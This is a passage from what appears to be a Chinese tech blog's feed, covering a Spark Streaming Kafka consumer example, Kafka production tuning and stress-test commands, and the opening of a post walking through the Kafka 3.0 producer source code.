class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">SparkKafkaConsumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="comment">//1.创建 SparkConf</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf: <span class="type">SparkConf</span> = <span class="keyword">new</span></span><br><span class="line">            <span class="type">SparkConf</span>().setAppName(<span class="string">"sparkstreaming"</span>).setMaster(<span class="string">"local[*]"</span>)</span><br><span class="line">        <span class="comment">//2.创建 StreamingContext</span></span><br><span class="line">        <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(sparkConf, <span class="type">Seconds</span>(<span class="number">3</span>))</span><br><span class="line">        <span class="comment">//3.定义 Kafka 参数：kafka 集群地址、消费者组名称、key 序列化、value 序列化</span></span><br><span class="line">        <span class="keyword">val</span> kafkaPara: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>] = <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>](</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">BOOTSTRAP_SERVERS_CONFIG</span> -&gt;</span><br><span class="line">              <span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>,</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">GROUP_ID_CONFIG</span> -&gt; <span class="string">"atguiguGroup"</span>,</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">KEY_DESERIALIZER_CLASS_CONFIG</span> -&gt;</span><br><span class="line">              classOf[<span class="type">StringDeserializer</span>],</span><br><span class="line">            <span class="type">ConsumerConfig</span>.<span class="type">VALUE_DESERIALIZER_CLASS_CONFIG</span> -&gt;</span><br><span class="line">              classOf[<span class="type">StringDeserializer</span>]</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">//4.读取 Kafka 数据创建 DStream</span></span><br><span class="line">        <span class="keyword">val</span> kafkaDStream: <span class="type">InputDStream</span>[<span class="type">ConsumerRecord</span>[<span class="type">String</span>, <span class="type">String</span>]] =</span><br><span class="line">            <span class="type">KafkaUtils</span>.createDirectStream[<span class="type">String</span>, <span class="type">String</span>](ssc,</span><br><span class="line">                <span class="type">LocationStrategies</span>.<span class="type">PreferConsistent</span>, <span class="comment">//优先位置</span></span><br><span class="line">                <span class="type">ConsumerStrategies</span>.<span class="type">Subscribe</span>[<span class="type">String</span>, <span class="type">String</span>](<span class="type">Set</span>(<span class="string">"first"</span>), kafkaPara)<span class="comment">// 消费策略：（订阅</span></span><br><span class="line">                  多个主题，配置参数）</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">//5.将每条消息的 KV 取出</span></span><br><span class="line">        <span class="keyword">val</span> valueDStream: <span class="type">DStream</span>[<span class="type">String</span>] = kafkaDStream.map(record =&gt; record.value())</span><br><span class="line">        <span class="comment">//6.计算 WordCount</span></span><br><span class="line">        valueDStream.print()</span><br><span class="line">        <span class="comment">//7.开启任务</span></span><br><span class="line">        ssc.start()</span><br><span class="line">        ssc.awaitTermination()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>四、Kafka生产调优</h1><h2 id="1、Kafka-硬件配置选择">1、Kafka 硬件配置选择</h2><h3 id="1-1-场景说明">1.1 场景说明</h3><ul><li>100 万日活，每人每天 100 条日志，每天总共的日志条数是 100 万 * 100 条 = 1 亿条</li><li>1 亿/24 小时/60 分/60 秒 = 1150 条/每秒钟</li><li>每条日志大小：0.5k - 2k（取 1k）</li><li>1150 条/每秒钟 * 1k ≈ 1m/s </li><li>高峰期每秒钟：1150 条 * 20 倍 = 23000 条</li><li>每秒多少数据量：20MB/s</li></ul><h3 id="1-2-服务器台数选择">1.2 服务器台数选择</h3><p><strong>服务器台数= 2 * （生产者峰值生产速率 * 副本 / 100） + 1</strong>= 2 * （20m/s * 2 / 100） + 1= 3 台</p><p>建议 3 台服务器</p><h3 id="1-3-内存选择">1.3 内存选择</h3><p>Kafka 内存组成：堆内存 + 页缓存，Kafka 堆内存建议每个节点：10g ~ 15g，在 <a href="http://kafka-server-start.sh" target="_blank" rel="noopener">kafka-server-start.sh</a> 中修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$KAFKA_HEAP_OPTS</span>"</span> = <span class="string">"x"</span> ]; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">export</span> KAFKA_HEAP_OPTS=<span class="string">"-Xmx10G -Xms10G"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>查看kafka内存使用情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jps</span><br><span class="line"><span class="comment"># 根据 Kafka 进程号，查看 Kafka 的 GC 情况</span></span><br><span class="line">jstat -gc 2321 1s 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># S0C：第一个幸存区的大小； S1C：第二个幸存区的大小</span></span><br><span class="line"><span class="comment"># S0U：第一个幸存区的使用大小； S1U：第二个幸存区的使用大小</span></span><br><span class="line"><span class="comment"># EC：伊甸园区的大小； EU：伊甸园区的使用大小</span></span><br><span class="line"><span class="comment"># OC：老年代大小； OU：老年代使用大小</span></span><br><span class="line"><span class="comment"># MC：方法区大小； MU：方法区使用大小</span></span><br><span class="line"><span class="comment"># CCSC:压缩类空间大小； CCSU:压缩类空间使用大小</span></span><br><span class="line"><span class="comment"># YGC：年轻代垃圾回收次数； YGCT：年轻代垃圾回收消耗时间</span></span><br><span class="line"><span class="comment"># FGC：老年代垃圾回收次数； FGCT：老年代垃圾回收消耗时间</span></span><br><span class="line"><span class="comment"># GCT：垃圾回收消耗总时间；</span></span><br><span class="line"><span class="comment"># 根据 Kafka 进程号，查看 Kafka 的堆内存</span></span><br><span class="line">jmap -heap 2321</span><br></pre></td></tr></table></figure><p>页缓存：页缓存是 Linux 系统服务器的内存。我们只需要保证 1 个 segment（1g）中25%的数据在内存中就好。每个节点页缓存大小 =（分区数 * 1g * 25%）/ 节点数。例如 10 个分区，页缓存大小=（10 * 1g * 25%）/ 3 ≈ 1g，建议服务器内存大于等于 11G</p><h3 id="1-4-其他硬件配置">1.4 其他硬件配置</h3><p><strong>磁盘选择</strong></p><p>kafka 底层主要是顺序写，固态硬盘和机械硬盘的顺序写速度差不多。建议选择普通的<strong>机械硬盘</strong>。每天总数据量：1 亿条 * 1k ≈ 100g，100g * 副本 2 * 保存时间 3 天 / 0.7 ≈ 1T，建议三台服务器硬盘总大小，大于等于 1T</p><p><strong>CPU 选择</strong></p><ul><li>num.io.threads = 8 负责写磁盘的线程数，整个参数值要占总核数的 50%</li><li>num.replica.fetchers = 1 副本拉取线程数，这个参数占总核数的 50%的 1/3</li><li>num.network.threads = 3 数据传输线程数，这个参数占总核数的 50%的 2/3。建议 32 个 cpu core</li></ul><p><strong>网络选择</strong></p><p>网络带宽 = 峰值吞吐量 ≈ 20MB/s 选择千兆网卡即可。100Mbps 单位是 bit；10M/s 单位是 byte ; 1byte = 8bit，100Mbps/8 = 12.5M/s。一般百兆的网卡（100Mbps ）、千兆的网卡（1000Mbps）、万兆的网卡（10000Mbps）。</p><h2 id="2、生产者、Topic、消费者">2、生产者、Topic、消费者</h2><p>具体的参数等详见第二章</p><h2 id="3、Kafka-总体调优">3、Kafka 总体调优</h2><h3 id="3-1-提升吞吐量">3.1 提升吞吐量</h3><ul><li>生产者buffer.memory：发送消息的缓冲区大小，默认值是 32m，可以增加到 64m</li><li>生产batch.size：默认是 16k。如果 batch 设置太小，会导致频繁网络请求，吞吐量下降；如果 batch 太大，会导致一条消息需要等待很久才能被发送出去，增加网络延时</li><li><a href="http://xn--linger-ol8i793x.ms" target="_blank" rel="noopener">生产linger.ms</a>，这个值默认是 0，意思就是消息必须立即被发送。一般设置一个 5-100毫秒。如果 <a href="http://linger.ms" target="_blank" rel="noopener">linger.ms</a> 设置的太小，会导致频繁网络请求，吞吐量下降；如果 <a href="http://linger.ms" target="_blank" rel="noopener">linger.ms</a> 太长，会导致一条消息需要等待很久才能被发送出去，增加网络延时</li><li>生产compression.type：默认是 none，不压缩，但是也可以使用 lz4 压缩，效率还是不错的，压缩之后可以减小数据量，提升吞吐量，但是会加大 producer 端的 CPU 开销</li><li>增加topic分区</li><li>消费者调整 fetch.max.bytes 大小，默认是 50m；调整 max.poll.records 大小，默认是 500 条</li><li>增加下游消费者处理能力</li></ul><h3 id="3-2-数据精准一次">3.2 数据精准一次</h3><ul><li>生产者角度acks 设置为-1 （acks=-1）；幂等性（enable.idempotence = true） + 事务</li><li>broker 服务端角度，分区副本大于等于 2 （–replication-factor 2），ISR 里应答的最小副本数量大于等于 2 （min.insync.replicas = 2）</li><li>消费者事务 + 手动提交 offset （enable.auto.commit = false）；消费者输出的目的地必须支持事务（MySQL、Kafka）</li></ul><h3 id="3-3-合理设置分区数">3.3 合理设置分区数</h3><p>创建一个只有 1 个分区的 topic。测试这个 topic 的 producer 吞吐量和 consumer 吞吐量。假设他们的值分别是 Tp 和 Tc，单位可以是 MB/s。然后假设总的目标吞吐量是 Tt，那么分区数 = Tt / min（Tp，Tc）</p><p>例如：producer 吞吐量 = 20m/s；consumer 吞吐量 = 50m/s，期望吞吐量 100m/s；分区数 = 100 / 20 = 5 分区，分区数一般设置为：3-10 个，分区数不是越多越好，也不是越少越好，需要搭建完集群，进行压测，再灵活调整分区个数。</p><h3 id="3-4-单条日志大于-1m">3.4 单条日志大于 1m</h3><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>message.max.bytes</td><td>默认 1m，broker 端接收每个批次消息最大值</td></tr><tr><td>max.request.size</td><td>默认 1m，生产者发往 broker 每个请求消息最大值，针对 topic级别设置消息体的大小</td></tr><tr><td>replica.fetch.max.bytes</td><td>默认 1m，副本同步数据，每个批次消息最大值</td></tr><tr><td>fetch.max.bytes</td><td>默认Default: 52428800（50 m）。消费者获取服务器端一批消息最大的字节数。如果服务器端一批次的数据大于该值（50m）仍然可以拉取回来这批数据，因此这不是一个绝对最大值。一批次的大小受message.max.bytes （broker config）or max.message.bytes （topic config）影响。</td></tr></tbody></table><h3 id="3-5-服务器宕机">3.5 服务器宕机</h3><ul><li>先尝试重新启动一下，如果能启动正常，那直接解决</li><li>如果重启不行，考虑增加内存、增加 CPU、网络带宽</li><li>如果将 kafka 整个节点误删除，如果副本数大于等于 2，可以按照服役新节点的方式重新服役一个新节点，并执行负载均衡</li></ul><h2 id="4、集群压力测试">4、集群压力测试</h2><ul><li>生产者压测：<a href="http://kafka-producer-perf-test.sh" target="_blank" rel="noopener">kafka-producer-perf-test.sh</a></li><li>消费者压测：<a href="http://kafka-consumer-perf-test.sh" target="_blank" rel="noopener">kafka-consumer-perf-test.sh</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =============生产者压测=============</span></span><br><span class="line"><span class="comment"># 创建一个 test topic，设置为 3 个分区 3 个副本</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --replication-factor 3 --partitions 3 --topic <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 在/opt/module/kafka/bin 目录下面有这两个文件</span></span><br><span class="line">bin/kafka-producer-perf-test.sh --topic <span class="built_in">test</span> --record-size 1024 --num-records 1000000 --throughput 10000 --producer-props bootstrap.servers=hadoop102:9092,hadoop103:9092,hadoop104:9092 batch.size=16384 linger.ms=0</span><br><span class="line"><span class="comment"># record-size 是一条信息有多大，单位是字节，本次测试设置为 1k</span></span><br><span class="line"><span class="comment"># num-records 是总共发送多少条信息，本次测试设置为 100 万条。</span></span><br><span class="line"><span class="comment"># throughput 是每秒多少条信息，设成-1，表示不限流，尽可能快的生产数据，可测出生产者最大吞吐量。本次实验设置为每秒钟 1 万条。</span></span><br><span class="line"><span class="comment"># producer-props 后面可以配置生产者相关参数，batch.size 配置为 16k</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果发现是9MB/s左右</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调整 batch.size 大小,batch.size 默认值是 16k。本次实验 batch.size 设置为 32k</span></span><br><span class="line"><span class="comment"># batch.size 默认值是 16k。本次实验 batch.size 设置为 4k</span></span><br><span class="line">bin/kafka-producer-perf-test.sh --topic <span class="built_in">test</span> --record-size 1024 --num-records 1000000 --throughput 10000 --producer-props bootstrap.servers=hadoop102:9092,hadoop103:9092,hadoop104:9092 batch.size=4096 linger.ms=0</span><br><span class="line"><span class="comment"># 调整 linger.ms 时间</span></span><br><span class="line"><span class="comment"># linger.ms 默认是 0ms。本次实验 linger.ms 设置为 50ms</span></span><br><span class="line">bin/kafka-producer-perf-test.sh --topic <span class="built_in">test</span> --record-size 1024 --num-records 1000000 --throughput 10000 --producer-props bootstrap.servers=hadoop102:9092,hadoop103:9092,hadoop104:9092 batch.size=4096 linger.ms=50</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调整压缩方式</span></span><br><span class="line"><span class="comment"># 默认的压缩方式是 none。本次实验 compression.type 设置为 snappy</span></span><br><span class="line">bin/kafka-producer-perf-test.sh --topic <span class="built_in">test</span> --record-size 1024 --num-records 1000000 --throughput 10000 --producer-props bootstrap.servers=hadoop102:9092,hadoop103:9092,hadoop104:9092 batch.size=4096 linger.ms=50 compression.type=snappy</span><br><span class="line"><span class="comment"># 默认的压缩方式是 none。本次实验 compression.type 设置为 zstd和gzip和lz4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调整缓存大小</span></span><br><span class="line"><span class="comment"># 默认生产者端缓存大小 32m。本次实验 buffer.memory 设置为 64m</span></span><br><span class="line">bin/kafka-producer-perf-test.sh --topic <span class="built_in">test</span> --record-size 1024 --num-records 1000000 --throughput 10000 --producer-props bootstrap.servers=hadoop102:9092,hadoop103:9092,hadoop104:9092 batch.size=4096 linger.ms=50 buffer.memory=67108864</span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================Consumer 压力测试==========</span></span><br><span class="line"><span class="comment"># 修改/opt/module/kafka/config/consumer.properties 文件中的一次拉取条数为 500</span></span><br><span class="line">max.poll.records=500</span><br><span class="line"><span class="comment"># 消费 100 万条日志进行压测</span></span><br><span class="line">bin/kafka-consumer-perf-test.sh --bootstrap-server hadoop102:9092,hadoop103:9092,hadoop104:9092 --topic <span class="built_in">test</span> --messages 1000000 --consumer.config config/consumer.properties</span><br><span class="line"><span class="comment"># --bootstrap-server 指定 Kafka 集群地址</span></span><br><span class="line"><span class="comment"># --topic 指定 topic 的名称</span></span><br><span class="line"><span class="comment"># --messages 总共要消费的消息个数。本次实验 100 万条</span></span><br><span class="line"><span class="comment"># 修改/opt/module/kafka/config/consumer.properties 文件中的一次拉取条数为 2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调整 fetch.max.bytes 大小为 100m</span></span><br><span class="line"><span class="comment"># 修改/opt/module/kafka/config/consumer.properties 文件中的拉取一批数据大小 100m</span></span><br><span class="line">fetch.max.bytes=104857600</span><br><span class="line">bin/kafka-consumer-perf-test.sh --broker-list hadoop102:9092,hadoop103:9092,hadoop104:9092 --topic <span class="built_in">test</span> --messages 1000000 --consumer.config config/consumer.properties</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Kafka概述和入门&lt;/h1&gt;
&lt;h2 id=&quot;1、Kafka概述&quot;&gt;1、Kafka概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-定义&quot;&gt;1.1 定义&lt;/h3&gt;
&lt;p&gt;Kafka是 一个开源的 分布式事件流平台 （Event StreamingPlatform），被数千家公司用于高性能数据管道、流分析、数据集成和关键任务应用。发布/订阅：消息的发布者不会将消息直接发送给特定的订阅者，而是将发布的消息分为不同的类别，订阅者只接收感兴趣的消息。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Kafka3.0源码学习</title>
    <link href="https://blog.shawncoding.top/posts/3ac4212b.html"/>
    <id>https://blog.shawncoding.top/posts/3ac4212b.html</id>
    <published>2024-02-06T07:04:10.000Z</published>
    <updated>2024-02-29T12:00:08.272Z</updated>
    
    <content type="html"><![CDATA[<h1>Kafka3.0源码学习</h1><blockquote><p>kafka官网：<a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener" title="https://kafka.apache.org/downloads">https://kafka.apache.org/downloads</a></p></blockquote><h1>一、生产者源码</h1><p><img src="http://qnypic.shawncoding.top/blog/202401251335148.png" alt></p><a id="more"></a><h2 id="1、初始化">1、初始化</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251335149.png" alt></p><p>生产者 main 线程初始化，点击 main()方法中的 KafkaProducer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">KafkaProducer(ProducerConfig config,</span><br><span class="line">          Serializer&lt;K&gt; keySerializer,</span><br><span class="line">          Serializer&lt;V&gt; valueSerializer,</span><br><span class="line">          ProducerMetadata metadata,</span><br><span class="line">          KafkaClient kafkaClient,</span><br><span class="line">          ProducerInterceptors&lt;K, V&gt; interceptors,</span><br><span class="line">          Time time) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.producerConfig = config;</span><br><span class="line">    <span class="keyword">this</span>.time = time;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取事务id</span></span><br><span class="line">    String transactionalId = config.getString(ProducerConfig.TRANSACTIONAL_ID_CONFIG);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取客户端id</span></span><br><span class="line">    <span class="keyword">this</span>.clientId = config.getString(ProducerConfig.CLIENT_ID_CONFIG);</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 监控kafka运行情况</span></span><br><span class="line">    JmxReporter jmxReporter = <span class="keyword">new</span> JmxReporter();</span><br><span class="line">    jmxReporter.configure(config.originals(Collections.singletonMap(ProducerConfig.CLIENT_ID_CONFIG, clientId)));</span><br><span class="line">    reporters.add(jmxReporter);</span><br><span class="line">    MetricsContext metricsContext = <span class="keyword">new</span> KafkaMetricsContext(JMX_PREFIX,</span><br><span class="line">            config.originalsWithPrefix(CommonClientConfigs.METRICS_CONTEXT_PREFIX));</span><br><span class="line">    <span class="keyword">this</span>.metrics = <span class="keyword">new</span> Metrics(metricConfig, reporters, time, metricsContext);</span><br><span class="line">    <span class="comment">// 获取分区器</span></span><br><span class="line">    <span class="keyword">this</span>.partitioner = config.getConfiguredInstance(</span><br><span class="line">            ProducerConfig.PARTITIONER_CLASS_CONFIG,</span><br><span class="line">            Partitioner<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">Collections</span>.<span class="title">singletonMap</span>(<span class="title">ProducerConfig</span>.<span class="title">CLIENT_ID_CONFIG</span>, <span class="title">clientId</span>))</span>;</span><br><span class="line">    <span class="keyword">long</span> retryBackoffMs = config.getLong(ProducerConfig.RETRY_BACKOFF_MS_CONFIG);</span><br><span class="line">    <span class="comment">// key和value的序列化</span></span><br><span class="line">    <span class="keyword">if</span> (keySerializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.keySerializer = config.getConfiguredInstance(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,</span><br><span class="line">                                                                                 Serializer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.keySerializer.configure(config.originals(Collections.singletonMap(ProducerConfig.CLIENT_ID_CONFIG, clientId)), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 拦截器处理（拦截器可以有多个）</span></span><br><span class="line">    List&lt;ProducerInterceptor&lt;K, V&gt;&gt; interceptorList = (List) config.getConfiguredInstances(</span><br><span class="line">            ProducerConfig.INTERCEPTOR_CLASSES_CONFIG,</span><br><span class="line">            ProducerInterceptor<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">            <span class="title">Collections</span>.<span class="title">singletonMap</span>(<span class="title">ProducerConfig</span>.<span class="title">CLIENT_ID_CONFIG</span>, <span class="title">clientId</span>))</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 单条日志大小 默认1m</span></span><br><span class="line">    <span class="keyword">this</span>.maxRequestSize = config.getInt(ProducerConfig.MAX_REQUEST_SIZE_CONFIG);</span><br><span class="line">    <span class="comment">// 缓冲区大小 默认32m</span></span><br><span class="line">    <span class="keyword">this</span>.totalMemorySize = config.getLong(ProducerConfig.BUFFER_MEMORY_CONFIG);</span><br><span class="line">    <span class="comment">// 压缩，默认是none</span></span><br><span class="line">    <span class="keyword">this</span>.compressionType = CompressionType.forName(config.getString(ProducerConfig.COMPRESSION_TYPE_CONFIG));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.maxBlockTimeMs = config.getLong(ProducerConfig.MAX_BLOCK_MS_CONFIG);</span><br><span class="line">    <span class="keyword">int</span> deliveryTimeoutMs = configureDeliveryTimeout(config, log);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.apiVersions = <span class="keyword">new</span> ApiVersions();</span><br><span class="line">    <span class="keyword">this</span>.transactionManager = configureTransactionState(config, logContext);</span><br><span class="line">    <span class="comment">// 缓冲区对象 默认是32m</span></span><br><span class="line">    <span class="comment">// 批次大小 默认16k</span></span><br><span class="line">    <span class="comment">// 压缩方式，默认是none</span></span><br><span class="line">    <span class="comment">// liner.ms 默认是0</span></span><br><span class="line">    <span class="comment">//  内存池</span></span><br><span class="line">    <span class="keyword">this</span>.accumulator = <span class="keyword">new</span> RecordAccumulator(logContext,</span><br><span class="line">            config.getInt(ProducerConfig.BATCH_SIZE_CONFIG),</span><br><span class="line">            <span class="keyword">this</span>.compressionType,</span><br><span class="line">            lingerMs(config),</span><br><span class="line">            retryBackoffMs,</span><br><span class="line">            deliveryTimeoutMs,</span><br><span class="line">            metrics,</span><br><span class="line">            PRODUCER_METRIC_GROUP_NAME,</span><br><span class="line">            time,</span><br><span class="line">            apiVersions,</span><br><span class="line">            transactionManager,</span><br><span class="line">            <span class="keyword">new</span> BufferPool(<span class="keyword">this</span>.totalMemorySize, config.getInt(ProducerConfig.BATCH_SIZE_CONFIG), metrics, time, PRODUCER_METRIC_GROUP_NAME));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接上kafka集群地址</span></span><br><span class="line">    List&lt;InetSocketAddress&gt; addresses = ClientUtils.parseAndValidateAddresses(</span><br><span class="line">            config.getList(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG),</span><br><span class="line">            config.getString(ProducerConfig.CLIENT_DNS_LOOKUP_CONFIG));</span><br><span class="line">    <span class="comment">// 获取元数据</span></span><br><span class="line">    <span class="keyword">if</span> (metadata != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.metadata = metadata;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.metadata = <span class="keyword">new</span> ProducerMetadata(retryBackoffMs,</span><br><span class="line">                config.getLong(ProducerConfig.METADATA_MAX_AGE_CONFIG),</span><br><span class="line">                config.getLong(ProducerConfig.METADATA_MAX_IDLE_CONFIG),</span><br><span class="line">                logContext,</span><br><span class="line">                clusterResourceListeners,</span><br><span class="line">                Time.SYSTEM);</span><br><span class="line">        <span class="keyword">this</span>.metadata.bootstrap(addresses);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.errors = <span class="keyword">this</span>.metrics.sensor(<span class="string">"errors"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.sender = newSender(logContext, kafkaClient, <span class="keyword">this</span>.metadata);</span><br><span class="line">    String ioThreadName = NETWORK_THREAD_PREFIX + <span class="string">" | "</span> + clientId;</span><br><span class="line">    <span class="comment">// 把sender线程放到后台</span></span><br><span class="line">    <span class="keyword">this</span>.ioThread = <span class="keyword">new</span> KafkaThread(ioThreadName, <span class="keyword">this</span>.sender, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 启动sender线程</span></span><br><span class="line">    <span class="keyword">this</span>.ioThread.start();</span><br><span class="line">    config.logUnused();</span><br><span class="line">    AppInfoParser.registerAppInfo(JMX_PREFIX, clientId, metrics, time.milliseconds());</span><br><span class="line">    log.debug(<span class="string">"Kafka producer started"</span>);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生产者 sender 线程初始化，KafkaProducer.java中点击 newSender()方法，查看发送线程初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 